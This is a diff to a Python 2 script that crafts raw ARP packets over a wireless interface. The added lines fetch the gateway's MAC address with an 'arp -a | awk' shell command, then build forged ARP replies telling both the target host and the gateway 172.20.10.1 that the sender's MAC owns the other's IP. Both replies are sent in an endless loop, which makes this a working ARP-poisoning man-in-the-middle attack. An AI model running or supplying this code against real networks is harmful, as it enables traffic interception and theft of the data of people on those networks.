@@ -3,6 +3,7 @@ import re
 import fcntl, socket, struct
 import binascii
 import time
+from subprocess import check_output
 
 
 '''Get IP and HA '''
@@ -24,15 +25,27 @@ def getHA(ifname):
     info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
     return ':'.join(['%02x' % ord(char) for char in info[18:24]])
 
-mac = getHA('wlp1s0')
+
+mac = getHA('wlp1s0').split(":")
 print mac
 
-m = mac.split(":")
-print m
-
 lst_HA = []
-for i in m:
-	lst_HA.append(int(i,16))
+for i in mac:
+	lst_HA.append(int(i,16)) #Source MAC
+
+print type(lst_HA[0])
+
+
+
+#get Gateway MAC
+
+hwData = check_output("arp -a | awk '$2~/(172.20.10.1)/{print $4;}'", shell = True) 
+# arp -a | awk '$NUM ~EQUAL /PATTERN/ {print $4;}'
+hwAddr= hwData.strip()
+
+
+
+'''First ARP Packet'''
 
 
 ARP =[
@@ -90,7 +103,6 @@ Target IP: c0 a8 01 e0 //4byte
 
 Get Sender's Mac
 '''
-
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)) #htons: gets all packets
 s.bind(("wlp1s0",0))#(device,0)
 s.send(b''.join(ARP)) #join ARP list elms and send data to socket
@@ -104,8 +116,8 @@ reply = binascii.hexlify(arp_reply)
 if reply == '0002': #if it is ARP reply get the Sender HA
 	reply_HA = packet[0][22:28]
 
-	replay_HA_dt = binascii.hexlify(reply_HA)
-	print "Source MAC:      ",replay_HA_dt
+	replay_HA_dt = binascii.hexlify(reply_HA) 
+	print "Source MAC:      ",replay_HA_dt, type(replay_HA_dt)
 	
 
 	if replay_HA_dt != "":
@@ -114,10 +126,7 @@ if reply == '0002': #if it is ARP reply get the Sender HA
 		for i in range(0, len(replay_HA_dt),2):
 			SENDER_HA.append(int(replay_HA_dt[i:i+2], 16))
 
-		print SENDER_HA
-#		SHA = ':'.join(s.encode('hex') for s in replay_HA_dt.decode('hex'))
-#		print SHA
-
+		print "SENDER",SENDER_HA
 #prints out 		
 
 		ARP2 =[
@@ -137,9 +146,39 @@ if reply == '0002': #if it is ARP reply get the Sender HA
 			struct.pack('!6B',*SENDER_HA),
 			struct.pack('!4B',172,20,10,7) ]
 
+'''
 		while(1):
 			s.send(b''.join(ARP2))
-			time.sleep(1)
+			time.sleep(3)
 
+'''
+
+
+GATE_HA = []
+for i in range(0, len(hwAddr),3):
+	GATE_HA.append(int(hwAddr[i:i+2], 16))
+
+print GATE_HA
+
+ARP3 =[	struct.pack('!6B',*GATE_HA), #Destination HA
+		struct.pack('!6B',*lst_HA), #Source HA
+		struct.pack('!H',0x0806), #ARP type
+		struct.pack('!H',0x0001), #HW type
+		struct.pack('!H',0x0800), 
+		struct.pack('!B',0x06),
+		struct.pack('!B',0x04),
+		struct.pack('!H',0x0002),
+		
+		struct.pack('!6B',*lst_HA), #Sender
+		struct.pack('!4B',172,20,10,7), #
+		struct.pack('!6B',*GATE_HA), #Target
+		struct.pack('!4B',172,20,10,1) ]
+
+#s.send(b''.join(ARP3))
+while(1):
+		s.send(b''.join(ARP2))
+		s.send(b''.join(ARP3))
+		time.sleep(3)
 
 s.close()
+
